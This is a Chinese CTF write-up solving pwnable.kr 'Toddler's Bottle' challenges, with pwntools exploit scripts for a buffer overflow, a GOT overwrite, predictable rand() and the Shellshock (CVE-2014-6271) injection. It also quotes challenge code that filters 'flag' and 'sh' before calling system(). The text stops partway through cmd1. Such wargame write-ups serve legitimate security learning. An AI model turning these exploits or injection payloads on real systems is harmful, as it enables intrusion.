# Pwnable.kr Toddler's Bottle

## 0x00 前言

被web题虐到自闭。。。。
想着去水一水pwn的新手题找找自信。。。。
结果还是被虐。。。。

![我的做题历程](/assets/images/909866567.jpeg)

最终总算是艰难的做完了

![结果](/assets/images/3176360730.jpg)

收货：

- pwntool ssh的连接方法和对应exp的写法
- pwntool recvline 截leak值的技巧
- agrc agrv envp 的意义
- 用python 交互行完成简单的运算
- 经典堆/栈溢出
- 经典uaf
- 经典unlink
- 经典rop
- 基础shellshock
- pipe通信

Todo:

- 32/64位程序寄存器的理解
- 结构体/类的内存布局
- socket编程
- 对基础pwn知识更深入的了解

## 0x01 fd

利用pwntool的ssh download_file功能下载源码

```cpp
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf))
	...
}
```
**关于agrc agrv envp**

>第一个参数argc记录了输入参数的个数。
>
>第二个参数是字符串数组的，字符串数组的每个单元是char*类型的，指向一个c风格字符串，arg[ ]指向的数组中至少有一个字符指针，即arg[0].他通常指向程序中的可执行文件的文件名。
>
>第三个参数是用来取得系统的环境变量，如：在DOS下，有一个PATH变量。当你在DOS提示符下输入一个命令的时候，DOS会首先在当前目录下找这个命令的执行文件。如果找不到，则到PATH定义的路径下去找，找到则执行，找不到返回Bad command or file name 。在DOS命令提示符下键入set可查看系统的环境变量
>

**关于参数fd**
fd 是打开的文件的句柄,它代表的是你打开的文件,
>
>stdin 标准输入的文件标识符为0
>
>stdout 标准输出的文件标识符为1
>
>stderr 标准错误输出的文件标识符为2

所以我们只要让fd为0指向标准输入流 再输入“LETMEWIN\n”就行了

### Exp


```python
#coding=utf-8
from pwn import *

payload=str(0x1234)

shell=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)
#shell.download_file('fd.c')
sh = shell.run('./fd'+' '+payload)
payload="LETMEWIN"
sh.sendline(payload)
sh.interactive()
```

## 0x02 collision

下载得到核心源码

```cpp
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;//把字符指针强转为int指针 char(1字节*4)->int(4字节)
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}
```

怎么构造p呢，粗暴平均分。。。。除5有小数就调整一下

```
>>>hex(int(0x21DD09EC+1)/5)
'0x6c5cec9'
```

然后可以构造exp

### Exp

```python
#coding=utf-8
from pwn import *

payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)

shell=ssh(host='pwnable.kr',user='col',password='guest',port=2222)
#shell.download_file('col.c')
sh = shell.run('./col'+' '+payload)
sh.interactive()
```

## 0x03 bof

最经典的gets溢出覆盖

在ida 里看参数a1和buf的差距，溢出覆盖就行了

```
#coding=utf-8
from pwn import *

io=remote("pwnable.kr",9000)
payload='a'*(0x2c+0x8)+p32(0xcafebabe)
io.sendline(payload)
io.interactive()
```

## 0x04 flag

直接下载下来用ida pro分析发现只有三个函数，而且还有一大堆shellcode在里面。。。。。

后来意识到可能加了壳，用

```
upx -d flag
```

脱壳后就可以正常ida pro逆向了

可以直接在里面找到flag

## 0x05 passcode

放到ida里分析

```cpp
  int v1; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d");
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d");
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
```

只要让

```
v1 == 338150 && v2 == 13371337
```

一开始以为welcome()和login()栈上为初始化，可以直接用weclome里的name进行覆盖passcode1,passcode2

```
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

~~但事实上由于passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9），又是用scanf %s,存在00截断,所以无法做到覆盖。。。~~

> 写了一个脚本发现 %100s 是会读100个字节（包括零字节） 

再看看栈布局

```cpp
//welcome()  
char v1; // [esp+18h] [ebp-70h]
unsigned int v2; // [esp+7Ch] [ebp-Ch] //这里的v2是Canary
//login()
int v1; // [esp+18h] [ebp-10h]
int v2; // [esp+1Ch] [ebp-Ch]
```

因为两次ebp不变，所以是可以覆盖的，但是只能覆盖到passcode1，也就是v1,v2由于Canary的开启无法被覆盖。。。

那怎么办呢，

注意到checksec告诉我们这个程序是没有开PIE（地址无关可执行文件）的，所以我们可以试着Hijack GOT

> GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。
>
> 如何确定函数 A 在 GOT 表中的条目位置？
>
> 程序调用函数时是通过 PLT 表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到 PLT 表中该函数的入口点位置，从而定位到该函数在 GOT 中的条目。
>
> 摘自《手把手教你栈溢出从入门到放弃（下)》https://zhuanlan.zhihu.com/p/25892385

实际上，可以利用scanf来修改此后使用到的某个函数的got表项。

```assembly
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
```

所以我们把地址修改到修改到0x080485E3就可以了

比如上面程序在

```c
scanf("%d", passcode1);
```

后立即使用了fflush函数，所以我们可以先找到fflush的got表项地址，

把覆盖passcode1为该地址

并在调用到scanf(“%d”, passcode1)

时输入程序代码中调用system("/bin/cat flag");处的地址(可在ida中找到)即可。

然后程序在执行fflush函数时就会执行system("/bin/cat flag");

Exp:

```
#coding=utf-8
from pwn import *

elf = ELF("./passcode")

fflush_got = elf.got["fflush"]
#print(hex(fflush_got))
sysh_addr=0x080485E3

shell=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)
#shell.download_file("./passcode.c")
#shell.download_file("./passcode")


payload="a"*(100-4)+p32(fflush_got)
sh=shell.run('./passcode')
sh.sendlineafter("enter you name :",payload)
payload=str(sysh_addr)
sh.sendlineafter("enter passcode1 :",payload)
sh.interactive()
```

## 0x06 random

关键源码

```cpp
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}
```

我们知道rand()是一个根据srand(seed)生成的伪随机数列，然后这里的seed又是固定的（未调用srand()）

就可以写Exp了

Exp:

```python
#coding=utf-8
from pwn import *
from ctypes import *
context(arch = 'amd64', os = 'linux')

libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

shell=ssh(host='pwnable.kr',user='random',password='guest',port=2222)
#shell.download_file("./random.c")
#shell.download_file("./random")

payload=str(0xdeadbeef^(libc.rand()))

sh=shell.run('./random')
sh.sendline(payload)
sh.interactive()
```

## 0x07 input

考察程序的各项基本操作

可惜我还没有那么多“常识”

### Stage 1 argv

```c
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	
```

一开始直接写

```
#payload=" a"*(ord('A')-1)+" \x00"+" a"*(ord('B')-ord('A'))+" \x20\x0a\x0d"+' a'*(100-ord('B')+1)
#sh=shell.run('./input'+payload)
```

发现\x20\x0a\x0d是空格换行回车。。。。会被当成分隔符不被读入。。。。

当然你也可以通过设置手动设置分隔符的方式通过Stage1

```
IFS='-'//设置分隔符为“-”
./input `python-c 'print"aaa-"*64+"\x00-"+"\x20\x0a\x0d-"+"aaa-"*33'`
```

最后还是发现写c脚本更好用

**Exp**

```c
#include<stdio.h>
#include<unistd.h>
int main(){
    char *argv[101]={"./input",
                     [1 ... 99]="A",/*C11 lambda表达式*/
                     NULL},
    	 *envp[2];
    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";

    execve("./input",argv,envp);
    return 0;
}
```

### Stage 2 stdio

```c
  char buf[4];
  read(0, buf, 4);
  if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
  read(2, buf, 4);
  if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
  printf("Stage 2 clear!\n");
```

标准输入输出流(0:stdin,1:stdout,2:stderr)

0还好办，2怎么控制呢？

可以利用pipe进行进程间通信

![Visualizing a pipe](/assets/images/unix-pipe.gif)

具体过程如下

> - Create two pipes: pipe2stdin and pipe2stderr
>
> - Fork the process
>
> - Child:
>
>   - write “\x00\x0a\x00\xff” to pipe2stdin
>   - write “\x00\x0a\x02\xff” to pipe2stderr
>
> - Parent:
>
> - - map the stdin to pipe2stdin
>   - map the stderr to pipe2stderr
>   - substitute the process with the execution of ‘input’

**Exp** 


```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int main(){
    char *argv[101]={"./input",
                     [1 ... 99]="A",
                     NULL},
    	 *envp[2];
    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";

    int pipe_stdin[2] = {-1,-1};
    int pipe_stderr[2] = {-1,-1};
    pid_t pid_child;
    
    if(pipe(pipe_stdin)<0 || pipe(pipe_stderr)<0){
        perror("pipe creation failed");
        exit(1);
    }


    #define STDIN_READ   pipe_stdin[0]//Parent
    #define STDIN_WRITE  pipe_stdin[1]//Child
    #define STDERR_READ  pipe_stderr[0]//Parent
    #define STDERR_WRITE pipe_stderr[1]//Child
    
    if((pid_child =fork())<0){
        perror("Cannot create fork child.");
        exit(1);
    }
    
    if(pid_child == 0){//child
        sleep(2);//wait for pipe func
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,"\x00\x0a\x00\xff",4);
        write(STDERR_WRITE,"\x00\x0a\x02\xff",4);
    }else {//parent
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,0);//stdin重定向到STDIN(pipe)
        dup2(STDERR_READ,2);//stderr重定向到STDERR(pipe)
        execve("./input",argv,envp);
            //perror("Fail to excute the program");
            //exit(1);
    }
    printf("pipe link.\n");
    return 0;
}
```

参考资料：

Linux Socket编程 http://unixwiz.net/techtips/remap-pipe-fds.html

### Stage3 env

```c
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");
```

同agrv一样，改下envp就行

**Exp**

````c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int main(){
    char *argv[101]={"./input",
                     [1 ... 99]="A",
                     NULL},
         *envp[2]={"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL};
    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";

    int pipe_stdin[2] = {-1,-1};
    int pipe_stderr[2] = {-1,-1};
    pid_t pid_child;
    
    if(pipe(pipe_stdin)<0 || pipe(pipe_stderr)<0){
        perror("pipe creation failed");
        exit(1);
    }


    #define STDIN_READ   pipe_stdin[0]
    #define STDIN_WRITE  pipe_stdin[1]
    #define STDERR_READ  pipe_stderr[0]
    #define STDERR_WRITE pipe_stderr[1]
    
    if( ( pid_child =fork() ) < 0 ){
        perror("Cannot create fork child.");
        exit(1);
    }
    
    if(pid_child == 0){//child
        //sleep(1);//wait for pipe func
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,"\x00\x0a\x00\xff",4);
        write(STDERR_WRITE,"\x00\x0a\x02\xff",4);
    }else {//parent
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,0);
        dup2(STDERR_READ,2);
        execve("./input",argv,envp);
            perror("Fail to excute the program");
            exit(1);
    }
    printf("pipe link.\n");
    return 0;
}
````

### Stage 4 file

```c
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	
```

写一个文件

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int main(){
    char *argv[101]={"./input",
                     [1 ... 99]="A",
                     NULL},
         *envp[2]={"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",
                  NULL};
    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";

    int pipe_stdin[2] = {-1,-1};
    int pipe_stderr[2] = {-1,-1};
    pid_t pid_child;
    
    if(pipe(pipe_stdin)<0 || pipe(pipe_stderr)<0){
        perror("pipe creation failed");
        exit(1);
    }


    #define STDIN_READ   pipe_stdin[0]
    #define STDIN_WRITE  pipe_stdin[1]
    #define STDERR_READ  pipe_stderr[0]
    #define STDERR_WRITE pipe_stderr[1]
    
    if( ( pid_child =fork() ) < 0 ){
        perror("Cannot create fork child.");
        exit(1);
    }
    
    if(pid_child == 0){//child
        //sleep(1);//wait for pipe func
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,"\x00\x0a\x00\xff",4);
        write(STDERR_WRITE,"\x00\x0a\x02\xff",4);
    }else {//parent
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,0);//recovery
        dup2(STDERR_READ,2);
        execve("./input",argv,envp);
    }
    printf("pipe linked.\n");

    FILE *fp= fopen("\x0a","wb");
    if(!fp) perror("Can not open file.");
    puts("Open file success.");
    fwrite("\x00\x00\x00\x00",4,1,fp);
    fclose(fp);

    return 0;
}
```

### Stage 5 network

```c
	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");
```

要求写个socket通信

一些前置知识：

```
AF_UNIX（本机通信）
AF_INET（TCP/IP – IPv4）
AF_INET6（TCP/IP – IPv6）
AF = Address Family
PF = Protocol Family

socket编程中需要用到的头文件
sys/types.h：数据类型定义
sys/socket.h：提供socket函数及数据结构
netinet/in.h：定义数据结构sockaddr_in
arpa/inet.h：提供IP地址转换函数
netdb.h：提供设置及获取域名的函数
sys/ioctl.h：提供对I/O控制的函数
sys/poll.h：提供socket等待测试机制的函数
```

照着大佬的wp写了一遍

**Exp**

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/types.h>
#include<sys/socket.h>//socket
#include<netinet/in.h>
#include<netdb.h>
#include<arpa/inet.h>

int main(){
    char *argv[101]={"./input",
                     [1 ... 99]="A",
                     NULL},
         *envp[2]={"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",
                  NULL};

    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";
    argv['C']="55555";//socket端口

    int pipe_stdin[2] = {-1,-1};
    int pipe_stderr[2] = {-1,-1};
    pid_t pid_child;
    
    if(pipe(pipe_stdin)<0 || pipe(pipe_stderr)<0){
        perror("pipe creation failed");
        exit(1);
    }


    #define STDIN_READ   pipe_stdin[0]
    #define STDIN_WRITE  pipe_stdin[1]
    #define STDERR_READ  pipe_stderr[0]
    #define STDERR_WRITE pipe_stderr[1]
    
    if( ( pid_child =fork() ) < 0 ){
        perror("Cannot create fork child.");
        exit(1);
    }
    
    if(pid_child == 0){//child
        //sleep(1);//wait for pipe func
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,"\x00\x0a\x00\xff",4);
        write(STDERR_WRITE,"\x00\x0a\x02\xff",4);
    }else {//parent
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,0);
        dup2(STDERR_READ,2);
        execve("./input",argv,envp);
    }
    printf("pipe linked.\n");

    FILE *fp= fopen("\x0a","wb");
    if(!fp) perror("Can not open file.");
    puts("Open file success.");
    fwrite("\x00\x00\x00\x00",4,1,fp);
    fclose(fp);

    sleep(2);
    char buf[10]={0};
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv['C']));
    servaddr.sin_addr.s_addr= inet_addr("127.0.0.1");

    int sockfd=socket(PF_INET,SOCK_STREAM,0);
    if(sockfd<0) {
        perror("\xde\xad\xbe\xef");
        exit(1);
    }
    if(connect(sockfd,(struct sockaddr *) &servaddr,sizeof(servaddr))<0){
        perror("connect error.");
        exit(1);
    }
    printf("socket connect.\n");
    strcpy(buf,"\xde\xad\xbe\xef");
    send(sockfd,buf,strlen(buf),0);
    close(sockfd);
    return 0;
}
```

> 如果作为一个服务器，在调用socket()、bind()之后就会调用listen()来监听这个socket，如果客户端这时调用connect()发出连接请求，服务器端就会接收到这个请求。
>
>```
>int listen(int sockfd, int backlog);
>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
>```
>listen函数的第一个参数即为要监听的socket描述字，第二个参数为相应socket可以排队的最大连接个数。socket()函数创建的socket默认是一个主动类型的，listen函数将socket变为被动类型的，等待客户的连接请求。
>connect函数的第一个参数即为客户端的socket描述字，第二参数为服务器的socket地址，第三个参数为socket地址的长度。客户端通过调用connect函数来建立与TCP服务器的连接。

参考资料

socket 编程 https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html

socket编程中write、read和send、recv之间的区别 https://www.cnblogs.com/George1994/p/6731091.html

### Final

在本地上可以过了

但是在服务器上还需要一些改动

首先题目目录是不可写的

所以我们要把程序放在其他地方

看可写目录·

```
ls -al /
drwxrwx-wt 5677 root root 159744 Dec  5 09:36 tmp
```

修改远程脚本

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/types.h>
#include<sys/socket.h>//socket
#include<netinet/in.h>
#include<netdb.h>
#include<arpa/inet.h>

int main(){
    char *argv[101]={"/home/input2/input",
                     [1 ... 99]="A",
                     NULL},
         *envp[2]={"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",
                  NULL};

    argv['A']="\x00";
    argv['B']="\x20\x0a\x0d";
    argv['C']="55566";

    int pipe_stdin[2] = {-1,-1};
    int pipe_stderr[2] = {-1,-1};
    pid_t pid_child;
    
    if(pipe(pipe_stdin)<0 || pipe(pipe_stderr)<0){
        perror("pipe creation failed");
        exit(1);
    }


    #define STDIN_READ   pipe_stdin[0]
    #define STDIN_WRITE  pipe_stdin[1]
    #define STDERR_READ  pipe_stderr[0]
    #define STDERR_WRITE pipe_stderr[1]
    
    if( ( pid_child =fork() ) < 0 ){
        perror("Cannot create fork child.");
        exit(1);
    }
    
    if(pid_child == 0){//child
        //sleep(1);//wait for pipe func
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,"\x00\x0a\x00\xff",4);
        write(STDERR_WRITE,"\x00\x0a\x02\xff",4);
    }else {//parent
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,0);
        dup2(STDERR_READ,2);
        execve("/home/input2/input",argv,envp);//绝对地址
    }
    //printf("pipe linked.\n");

    FILE *fp= fopen("\x0a","wb");
    if(!fp) perror("Can not open file.");
    //puts("Open file success.");
    fwrite("\x00\x00\x00\x00",4,1,fp);
    fclose(fp);

    sleep(2);
    char buf[10]={0};
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv['C']));
    servaddr.sin_addr.s_addr= inet_addr("127.0.0.1");

    int sockfd=socket(PF_INET,SOCK_STREAM,0);
    if(sockfd<0) {
        perror("\xde\xad\xbe\xef");
        exit(1);
    }
    if(connect(sockfd,(struct sockaddr *) &servaddr,sizeof(servaddr))<0){
        perror("connect error.");
        exit(1);
    }
    printf("socket connect.\n");
    strcpy(buf,"\xde\xad\xbe\xef");
    send(sockfd,buf,strlen(buf),0);
    close(sockfd);
    return 0;
}
```

还有一个坑点是程序拿flag是当前目录下的

而当前目录/tmp下并没有

所以还要创建一个软连接

```
ln /home/input/flag flag
```

放在服务器上跑一跑就出flag了

## 0x08 leg

通过分析arm平台汇编代码计算三个key值

key1

```assembly
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
```

r3为程序返回值，pc=0x00008cdc+8

```
对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址(ARM体系结构采用的多级流水线技术),即PC的值为当前指令的地址值加8个字节程序状态寄存器。
```

所以

```
key1=0x00008cdc+0x08
```

```assembly
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6           ;r6最后一位是1 进入ARM thumb模式 pc=当前地址+4
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
```

所以有

```
key2=0x00008d04+0x04+0x04
```

key3

```assembly
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
```

可以看到r3=lr

lr是key3的程序返回地址

在main里找一下

```assembly
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0          ;在这
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
```

所以

```
key3=0x00008d80
```

### Exp

```python
#coding=utf-8
from pwn import *

shell=ssh(host='pwnable.kr',user='leg',password='guest',port=2222)

key1=0x00008cdc+0x08
key2=0x00008d04+0x04+0x04
key3=0x00008d80

print(str(key1+key2+key3))
leg=shell.run("sh")
leg.sendline(str(key1+key2+key3))
leg.interactive()
```

### 参考资料

http://blog.chinaunix.net/uid-28458801-id-3792828.html

https://www.cnblogs.com/wrjvszq/p/4199682.html

## 0x09 misktake

看了很久才反应过来是运算符优先级的问题

```c
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){//比较运算符优先级高于赋值运算符 fd始终为0 也即stdin
		printf("can't open password %d\n", fd);
		return 0;
	}
```

然后自己构造一组密码就行

比如 0000000000 -xor()-> 1111111111

### Exp

```python
#coding=utf-8
from pwn import *


shell=ssh(host='pwnable.kr',user='mistake',password='guest',port=2222)
#shell.download_file("./mistake.c")
#shell.download_file("./mistake")


io=shell.run('./mistake')
payload="0000000000"
io.sendafter("do not bruteforce...\n",payload)
payload="1111111111"
io.sendafter("input password : ",payload)
io.interactive()
```

## 0x0A  shellsock

CVE-2014-6271 Shellsock

利用方式：

```bash
env x='() { :;}; echo vulnerable'  bash -c "echo this is a test"
```

原理分析：https://blog.csdn.net/tinyletero/article/details/40261593

题目源码

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

程序目录权限(ls -l)

```
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

注意到 flag是shellshock_pwn可读的

所以我们可以利用./shellsock程序获得读权限，加上之前利用shellsock拼接的“cat flag”就可以读到flag了

Exp:

```python
#coding=utf-8
from pwn import *


shell=ssh(host='pwnable.kr',user='shellshock',password='guest',port=2222)

#shell.download_file("./shellshock.c")
#shell.download_file("./shellshock")

sh=shell.run('sh')
sh.sendline("env x='() { :;}; bash -c \"cat flag\" ' ./shellshock")
sh.interactive()
```

## 0x0B coin

称硬币找不同

直接二分就可

```python
#coding=utf-8
from pwn import *
import re #正则表达式取数

io=remote("pwnable.kr","9007")
io.recv()

def GetWeight(l,r):
    sendstr = ""
    if l==r:
        io.sendline(str(l))
    else :
        for i in range(l,r+1):
            sendstr = sendstr + str(i)+" "
        io.sendline(sendstr)
    ret = io.recvline()
    return int(ret)
        

def solve(num,chance):
    l=0
    r=num-1
    weight=0
    for i in range(0,chance):
        weight=GetWeight(l,int(l+(r-l)/2))
        if weight%10!=0:
            r = int(l+(r-l)/2)
        else:
            l = int(l+(r-l)/2)+1
    io.sendline(str(r))
    print '[+]server:',io.recvline()



for i in range(0,100):
    quest = io.recvline()
    q = re.compile(r'\d+')#取数字
    data = q.findall(quest)
    N = int(data[0])
    C = int(data[1])
    #print N,C
    solve(N,C)
io.interactive()
```

本地跑了20个就60s了，放在服务器上跑才过。。。（利用input那道题的账户。。。。。）

## 0x0C blackjack

程序逻辑漏洞

下负数赌注，输了就拿到正数的钱了。。。。。。。

## 0x0D lotto

源码中比较过程存在问题

```c
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){ //事实上只要submit[j]同时押中一个lotto[i]就能刷满分
				match++;
			}
		}
	}
```

大大降低了爆破难度，跑个脚本就可以了

**Exp**

```
#coding=utf-8
from pwn import *

shell=ssh("lotto","pwnable.kr",2222,"guest")

#shell.download_file("./lotto.c")
sh=shell.run("./lotto")
sh.recv()

payload=chr(1)+chr(1)+chr(1)+chr(1)+chr(1)+chr(1)

while 1:
    sh.sendline("1")
    print sh.recv()
    sh.sendline(payload)
    text=sh.recv()
    print len(text)
    if len(text)>71:
        print text
        break
```

## 0x0E cmd1

```cpp
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

可以看到设置了PATH 到/thankyoueverymuch,所以在/bin的二进制文件比如ls,pwd啥的就不能用了。。。。

